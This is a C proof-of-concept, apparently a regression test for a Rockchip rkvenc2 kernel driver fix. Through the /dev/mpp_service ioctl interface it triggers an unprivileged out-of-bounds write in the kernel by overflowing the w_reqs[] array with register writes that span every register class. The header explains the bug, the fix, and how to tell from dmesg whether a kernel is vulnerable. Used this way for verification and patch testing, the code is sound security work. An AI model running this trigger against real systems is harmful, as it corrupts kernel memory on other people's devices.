// SPDX-License-Identifier: GPL-2.0
/*
 * PoC — RKVENC2 register-request fan-out out-of-bounds write (forward-port
 * 0063 / Rockchip BSP develop-6.1 rk_vcodec, rkvenc2 task-init in
 * mpp_rkvenc2.c).
 *
 * rkvenc2's task holds fixed arrays:
 *     struct mpp_request w_reqs[MPP_MAX_MSG_NUM];   // MPP_MAX_MSG_NUM == 16
 *     struct mpp_request r_reqs[MPP_MAX_MSG_NUM];
 * For each MPP_CMD_SET_REG_WRITE message, the task-init loop iterates the nine
 * register classes and, for every class the request's [offset, offset+size]
 * range overlaps (req_over_class()), copies into w_reqs[w_req_cnt++]. Pre-fix,
 * w_req_cnt was not bounded, so enough class-spanning writes push w_req_cnt
 * past 16 and copy struct mpp_request data past the array into adjacent task
 * fields — an unprivileged OOB kernel write. SET_REG_READ overflows r_reqs[]
 * the same way.
 *
 * Each write here uses offset=0 with a large size so it overlaps all nine
 * classes; a handful of such messages exceeds 16 class-matches. /dev/mpp_service
 * is group "video".
 *
 * Fixed behaviour (0063): "w_req_cnt 16 overflow" is logged and the job is
 * rejected with -EINVAL before the 17th copy. This PoC drives the path; check
 * dmesg for that guard line (fix present) vs a KASAN slab-out-of-bounds write
 * (vulnerable).
 *
 * Unprivileged. cc -O1 -Wall -o rkvenc2-req-fanout-oob-repro \
 *                  rkvenc2-req-fanout-oob-repro.c
 */
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <linux/rk-mpp.h>

#define MPP_MAX_MSG_NUM		16
/*
 * Span all nine VEPU580 register classes so each SET_REG_WRITE fans out to nine
 * w_reqs[] increments. The classes run BASE(0x0000) .. DEBUG(0x5000-0x5354), so
 * a request [0, 0x5358) overlaps every class (req_over_class: offset <= base_e
 * && offset+size-4 >= base_s). Three such messages = 27 class-matches, well
 * past the 16-slot array.
 */
#define REG_SPAN		0x5358
#define NR_WRITES		3

int main(void)
{
	int fd = open("/dev/mpp_service", O_RDWR | O_CLOEXEC);
	if (fd < 0) { perror("open /dev/mpp_service"); return 2; }

	unsigned int support = 0;
	ioctl(fd, MPP_IOC_CFG_V1, &(struct mpp_request){
		.cmd = MPP_CMD_QUERY_HW_SUPPORT, .size = sizeof(support),
		.data = &support });
	unsigned int client = 16;			/* RKVENC */
	if (!(support & (1u << client))) {
		fprintf(stderr, "RKVENC(16) not supported (hw_support=%#x)\n", support);
		return 2;
	}
	if (ioctl(fd, MPP_IOC_CFG_V1, &(struct mpp_request){
			.cmd = MPP_CMD_INIT_CLIENT_TYPE, .size = sizeof(client),
			.data = &client }) != 0) {
		perror("INIT_CLIENT_TYPE"); return 2;
	}

	/* User buffer large enough for the copy of each class's overlap. */
	unsigned char *buf = calloc(1, 0x10000);
	if (!buf) return 2;

	/* Batch of NR_WRITES class-spanning SET_REG_WRITE messages + LAST. */
	struct mpp_request batch[NR_WRITES];
	memset(batch, 0, sizeof(batch));
	for (int i = 0; i < NR_WRITES; i++) {
		batch[i].cmd = MPP_CMD_SET_REG_WRITE;
		batch[i].flags = MPP_FLAGS_MULTI_MSG;
		batch[i].offset = 0;
		batch[i].size = REG_SPAN;
		batch[i].data = buf;
	}
	batch[NR_WRITES - 1].flags = MPP_FLAGS_MULTI_MSG | MPP_FLAGS_LAST_MSG;

	printf("submitting %d class-spanning SET_REG_WRITE msgs "
	       "(w_reqs[] has %d slots) -> OOB write on a vulnerable kernel\n",
	       NR_WRITES, MPP_MAX_MSG_NUM);
	int r = ioctl(fd, MPP_IOC_CFG_V1, batch);
	printf("ioctl ret=%d errno=%d\n", r, r ? errno : 0);
	printf("check dmesg: fixed kernel logs \"w_req_cnt %d overflow\" and "
	       "no KASAN out-of-bounds write.\n", MPP_MAX_MSG_NUM);

	free(buf);
	close(fd);
	return 0;
}
